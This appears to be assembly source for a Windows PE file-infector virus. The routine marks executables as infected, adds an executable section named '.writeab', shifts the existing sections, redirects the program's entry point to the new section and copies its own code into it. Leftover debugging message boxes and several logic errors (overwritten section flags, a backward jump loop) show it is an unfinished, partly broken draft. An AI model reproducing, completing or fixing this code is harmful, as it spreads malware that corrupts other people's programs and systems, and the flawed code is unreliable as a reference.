ifndef INFECT_FILE_ASM_
INFECT_FILE_ASM_ MACRO
ENDM

include utils.asm

; Parse and modify the executable mapped in memory to inject our code.
; ebx = delta offset
;infect_file PROC NEAR ;filebuffer:DWORD, filesize:DWORD;, virtualfree_addr:DWORD, virtualalloc_addr:DWORD
;jmp start_infect
lastsec_ptrtorawdata dd 0;LOCAL lastsec_ptrtorawdata:DWORD
lastsec_sizeofrawdata dd 0;LOCAL lastsec_sizeofrawdata:DWORD
lastsec_virtualaddress dd 0;LOCAL lastsec_virtualaddress:DWORD
lastsec_virtualsize dd 0;LOCAL lastsec_virtualsize:DWORD

ptr_adressofentrypoint dd 0;LOCAL ptr_adressofentrypoint:DWORD
ptr_numberofsections dd 0;LOCAL ptr_numberofsections:DWORD
ptr_sizeofcode dd 0;LOCAL ptr_sizeofcode:DWORD
ptr_sizeofimage dd 0;LOCAL ptr_sizeofimage:DWORD
ptr_sizeofheaders dd 0;LOCAL ptr_sizeofheaders:DWORD

imagebase dd 0;LOCAL imagebase:DWORD
filealignment dd 0;LOCAL filealignment:DWORD
oldentrypoint dd 0;LOCAL oldentrypoint:DWORD
pointertorawdata dd 0;LOCAL pointertorawdata:DWORD
ptr_sectionhdrtable dd 0;LOCAL ptr_sectionhdrtable:DWORD
sectionalignment dd 0;LOCAL sectionalignment:DWORD
tmpbuf dd 0;LOCAL tmpbuf:DWORD
jambi_firm dd 0
jambi_firm_loc dd 0
format_db_1 db "Firm is: %d", 0
format_db_2 db "What was found: %d", 0
format_db_3 db "IMAGE_FILE_HEADER: %d", 0
format_db_4 db "Number of sections: %d", 0
msgCaption_db_1 db "Bytes comparation", 0
msgCaption_db_3 db "Image file header", 0
msgCaption_db_4 db "Number of sections", 0
buffer_db_3 db 256 dup (0)  ; Buffer #3 for formatted string
buffer_db_4 db 256 dup (0)  ; Buffer #4 for formatted string
start_infect:
   
    pushad


    
    cmp  WORD ptr [esi], "ZM"   
                ;
   
    jne  infect_err                           ; Check DOS signature
    xor ecx,ecx
    mov  ecx, 042h
     
       
    cmp  dword ptr[esi + 034h], ecx
    

    
    
    je   infect_err                           ; Check if file already infected. Infection marker at IMAGE_DOS_HEADER + 0x34 (e_res2[8])
     invoke MessageBoxA, NULL,addr msgText, addr msgCaption, MB_OK 
    invoke MessageBoxA, NULL,ecx, addr msgCaption_db_1, MB_OK 
     
    mov  dword ptr[esi + 034h], ecx                    ; mark file as infected.
   ; esi -> IMAGE_NT_HEADERS
   
   invoke MessageBoxA, NULL, esi, addr msgCaption, MB_OK
    add esi,0f0h
    invoke MessageBoxA, NULL,esi, addr msgCaption, MB_OK 
    cmp  word ptr [esi], "EP"                 ;
    
    
    jne  infect_err                           ; Check PE signature
    
    push esi                                  ; esi -> IMAGE_NT_HEADERS

    add  esi, 04h                             ; esi -> IMAGE_FILE_HEADER
    invoke MessageBoxA, NULL,addr msgText, addr msgCaption, MB_OK 
    invoke wsprintf, addr buffer_db_3, addr format_db_3, esi
    invoke MessageBoxA, NULL, addr buffer_db_3, addr msgCaption_db_3, MB_OK
    
    
    lea  ecx, dword  ptr[esi + 02h]    
    invoke MessageBoxA, NULL,addr msgText, addr msgCaption, MB_OK   
    invoke wsprintf, addr buffer_db_4, addr format_db_4, ecx
    invoke MessageBoxA, NULL, addr buffer_db_4, addr msgCaption_db_4, MB_OK  
              ;
    mov  ptr_numberofsections, ecx            ; Got IMAGE_NT_HEADER.NumberOfSections

    pop  esi                                  ; esi -> IMAGE_NT_HEADERS
    push esi
    add  esi, 018h                            ; esi -> IMAGE_OPTIONAL_HEADER

    xor  ecx, ecx                             ; DataDirectory[11] = export table bound headers.
    mov  [esi + (60h + 11 * SIZEOF IMAGE_DATA_DIRECTORY)], ecx     ; IMAGE_OPTIONAL_HEADER.DataDirectory[11].VirtualAddress = 0
    mov  [esi + (60h + 11 * SIZEOF IMAGE_DATA_DIRECTORY) + 4], ecx ; IMAGE_OPTIONAL_HEADER.DataDirectory[11].VirtualSize = 0
                                              ; We have to do this b/c in some cases it overlaps with our new header of section.

    cmp  word ptr [esi], 010bh                ; Check 32bit magic (010bh)
    jne  infect_err

    lea  ecx, [esi + 04h]                     ;
    mov  ptr_sizeofcode, ecx                  ; Got IMAGE_OPTIONAL_HEADER.SizeOfCode
    lea  ecx, [esi + 010h]                    ;
    mov  ptr_adressofentrypoint, ecx          ; Got IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint
    mov  ecx, [esi + 01ch]                    ;
    mov  imagebase, ecx                       ; Got IMAGE_OPTIONAL_HEADER.ImageBase
    mov  ecx, [esi + 020h]                    ;
    mov  sectionalignment, ecx                ; Got IMAGE_OPTIONAL_HEADER.SectionAlignment
    mov  ecx, [esi + 024h]                    ;
    mov  filealignment, ecx                   ; Got IMAGE_OPTIONAL_HEADER.FileAlignment
    lea  ecx, [esi + 038h]                    ;
    mov  ptr_sizeofimage, ecx                 ; Got IMAGE_OPTIONAL_HEADER.SizeOfImage
    lea  ecx, [esi + 03ch]                    ;
    mov  ptr_sizeofheaders, ecx               ; Got IMAGE_OPTIONAL_HEADER.SizeOfHeaders

    pop  esi                                  ; esi -> IMAGE_NT_HEADERS

    add  esi, SIZEOF IMAGE_NT_HEADERS         ; esi -> IMAGE_SECTION_HEADER[0]
    mov  ptr_sectionhdrtable, esi

    mov  ecx, ptr_numberofsections
    xor  eax, eax
    mov  ax, WORD ptr [ecx]                   ; eax = number of sections ( = *ptr_numberofsections)

    mov  ecx, SIZEOF IMAGE_SECTION_HEADER
    sub  eax, 1
    mul  ecx
    add  esi, eax                             ; esi -> IMAGE_SECTION_HEADER[last]

    mov  ecx, [esi + 08h]
    mov  lastsec_virtualsize, ecx             ; Got IMAGE_SECTION_HEADER[last].VirtualSize
    mov  ecx, [esi + 0ch]
    mov  lastsec_virtualaddress, ecx          ; Got IMAGE_SECTION_HEADER[last].VirtualAddress
    mov  ecx, [esi + 010h]
    mov  lastsec_sizeofrawdata, ecx           ; Got IMAGE_SECTION_HEADER[last].SizeOfRawData
    mov  ecx, [esi + 014h]
    mov  lastsec_ptrtorawdata, ecx            ; Got IMAGE_SECTION_HEADER[last].PointerToRawData

; --------------------------------------> If the first section starts before 0x400 in the file, we won't have enough space for our extra header.
; --------------------------------------> That's why if it is the case we need to move all the sections in the file by filealignment bytes.

    push esi                                  ; esi -> IMAGE_SECTION_HEADER[last]

    mov  esi, ptr_sectionhdrtable             ; esi -> IMAGE_SECTION_HEADER[0]
    mov  esi, [esi + 014h]
    
    lea edx,filebuffer ;milacommit                    ; esi = IMAGE_SECTION_HEADER[0].PointerToRawData
    add  esi, edx                         ; esi is now destination pointer for memmove()
    mov  edi, filealignment
    add  edi, esi                             ; destination is just 1 filealignment further.
    mov  edx, lastsec_ptrtorawdata
    add  edx, lastsec_sizeofrawdata
    mov  ecx, ptr_sectionhdrtable             ;
    sub  edx, [ecx + 014h]                    ; edx -= IMAGE_SECTION_HEADER[0].PointerToRawData. We don't copy the headers and padding to first section.

                                              ; Now, edi -> destination, esi -> source, edx = quantity.
                                              ; Need to malloc a temporary buffer to move the overlapping fields. Stack will explode if we use it.

    push edi
    push esi
    push edx                                  ; Save registers b/c of function call.

    push 04h                                  ; read/write permissions
    push 00001000h                            ; MEM_COMMIT
    push edx                                  ; size to allocate
    push 0                                    ; address. NULL == we want a new address
    call virtualalloc_addr                    ; VirtualAlloc()
    mov  tmpbuf, eax
    cmp  eax, 0
    je   infect_err

    pop  edx
    pop  esi
    pop  edi                                  ; Restore registers after function call.

    push edi
    mov  edi, tmpbuf
    call my_memcpy                            ; copy sections to tmpbuf
    pop  edi                                  ; edi -> destination
    mov  esi, tmpbuf
    call my_memcpy                            ; copy sections back to mapped file.

    push 08000h
    push 0
    push tmpbuf
    call virtualfree_addr

; --------------------------------------> Update all section headers for new sections offsets in file, ie add filealignment to their offset.

    xor  edx, edx
    mov  edi, ptr_numberofsections
    xor  eax, eax
    mov  ax, WORD ptr [edi]                   ; eax = number of sections ( = *ptr_numberofsections)
    mov  edi, eax                             ; edi = numberofsections
    mov  esi, ptr_sectionhdrtable             ; esi -> IMAGE_SECTION_HEADER[0]
update_sec_hdrs:
    mov  ecx, [esi + 014h]                    ; esi -> IMAGE_SECTION_HEADER[edx].PointerToRawData
    add  ecx, filealignment                   ;
    mov  [esi + 014h], ecx                    ; IMAGE_SECTION_HEADER[edx].PointerToRawData += filealignment
    inc  edx
    add  esi, SIZEOF IMAGE_SECTION_HEADER
    cmp  edx, edi                             ; while edx < numberofsections
    jne  update_sec_hdrs

dont_move_sections:
; --------------------------------------> Now we can move on to write our new section header.

    pop  esi                                  ; esi -> IMAGE_SECTION_HEADER[last]

    mov  edi, lastsec_virtualsize
    push sectionalignment
    push edi
    call ceil_align
    add  eax, lastsec_virtualaddress          ;
    mov  edx, eax                             ; edx = virtualaddress for new section ( = lastsec.virtualaddress + ceil(lastsec.virtualsize) )
    mov  eax, lastsec_sizeofrawdata
    push filealignment
    push eax
    call ceil_align
    add  eax, lastsec_ptrtorawdata            ;
    mov  ecx, eax   
    lea eax , filebuffer                         ; ecx = pointertorawdata for new section ( = lastsec.pointertorawdata + ceil(lastsec.sizeofrawdata) )
    sub  ecx, eax

    mov  eax, ptr_sectionhdrtable             ;
    mov  esi, [eax + 014h]                    ; esi = IMAGE_SECTION_HEADER[0].PointerToRawData
   lea eax , filebuffer                       
   sub  esi, eax                      ; esi -> IMAGE_SECTION_HEADER[0].PointerToRawData

    cmp  esi, 0400h
    jae  skip_mov                             ; If section headers starts after 0x400 we can go on and write our header.
    jmp  dont_move_sections                   ; Else we need to move sections.

skip_mov:
    mov  edi, ptr_numberofsections
    inc  WORD ptr [edi]                       ; Increase number of sections.

    pop  esi                                  ; esi -> IMAGE_SECTION_HEADER[last]

    add  esi, SIZEOF IMAGE_SECTION_HEADER     ; esi -> IMAGE_SECTION_HEADER[new]

    lea  edi, [esi + 024h]
    xor  eax, eax
    mov  [edi], eax                           ; Write IMAGE_SECTION_HEADER[new].reserved = 0
    sub  edi, 024h

    mov  byte ptr [esi + 000], "."     ; Write IMAGE_SECTION_HEADER[new].Name
    mov  byte ptr [esi + 001], "w"     ; Write IMAGE_SECTION_HEADER[new].Name
    mov  byte ptr [esi + 002], "r"     ; Write IMAGE_SECTION_HEADER[new].Name
    mov  byte ptr [esi + 003], "i"     ; Write IMAGE_SECTION_HEADER[new].Name
    mov  byte ptr [esi + 004], "t"     ; Write IMAGE_SECTION_HEADER[new].Name
    mov  byte ptr [esi + 005], "e"     ; Write IMAGE_SECTION_HEADER[new].Name
    mov  byte ptr [esi + 006], "a"     ; Write IMAGE_SECTION_HEADER[new].Name
    mov  byte ptr [esi + 007], "b"     ; Write IMAGE_SECTION_HEADER[new].Name
    mov  eax, 00002000h                       ;
    mov  [esi + 024h], eax                    ; IMAGE_SECTION_HEADER[new].Characteristics = IMAGE_SCN_MEM_WRITE
    mov  eax, 020000000h
    mov  [esi + 024h], eax                    ; IMAGE_SECTION_HEADER[new].Characteristics |= IMAGE_SCN_CNT_CODE
    mov  eax, 0C0000040h
    mov  [esi + 024h], eax                    ; IMAGE_SECTION_HEADER[new].Characteristics |= IMAGE_SCN_MEM_EXECUTE
    mov  eax, 040000000h
    mov  [esi + 024h], eax                    ; IMAGE_SECTION_HEADER[new].Characteristics |= IMAGE_SCN_CNT_UNINITIALIZED_DATA

    mov  eax, edx                             ;
    mov  dword ptr[esi + 00ch], eax                    ; IMAGE_SECTION_HEADER[new].VirtualAddress = new_section_virtualaddress
    mov  dword ptr[esi + 008h], 1000h                  ; IMAGE_SECTION_HEADER[new].VirtualSize = 4096 bytes (1 page)
    mov  dword ptr[esi + 014h], ecx                    ; IMAGE_SECTION_HEADER[new].PointerToRawData = new_section_pointertorawdata
    mov  dword ptr[esi + 010h], 1000h                  ; IMAGE_SECTION_HEADER[new].SizeOfRawData = 4096 bytes (1 page)

; --------------------------------------> Update relevant fields in PE header (sizeofcode, sizeofimage, addressofentrypoint).

    mov  eax, ptr_sizeofcode
    add  DWORD ptr [eax], 1000h               ; IMAGE_OPTIONAL_HEADER.SizeOfCode += 4096

    mov  eax, ptr_sizeofimage
    add  DWORD ptr [eax], 1000h               ; IMAGE_OPTIONAL_HEADER.SizeOfImage += 4096

    mov  eax, ptr_adressofentrypoint
    mov  edx, [eax]                           ;
    mov  oldentrypoint, edx                   ; Save IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint
    mov  DWORD ptr [eax], ecx                 ; IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint = new_section_pointertorawdata

    mov  eax, ptr_sizeofheaders
    mov ebx,filealignment
    add  dword ptr[eax], ebx       ; IMAGE_OPTIONAL_HEADER.SizeOfHeaders += filealignment

; --------------------------------------> Write our own code to the new section.

    mov  eax, ecx                             ;
    lea edi,filebuffer
    
    add  eax, edi                        ; eax = filebuffer + new_section_pointertorawdata

    
    mov  edi, eax                             ; edi -> start of new section
    push esi
    mov  esi, begin_copy
    add  esi,ebx ;delta offset                 ;
    mov  ecx, ptr_sizeofimage;our_code_size
    call my_memcpy                            ; Copy our code to the new section.
    pop esi
    add  edi, ptr_sizeofcode
    sub  eax, eax
    mov  ecx, 1000h
    sub  ecx, ptr_sizeofcode
    call my_memset                            ; Fill the rest of the new section with 0.

    popad

    mov  eax, sizeof filebuffer

    ret
infect_err:
    popad
    xor  eax, eax
    ret

infect_file_ENDP:;infect_file ENDP

endif                                         ; INFECT_FILE_ASM_
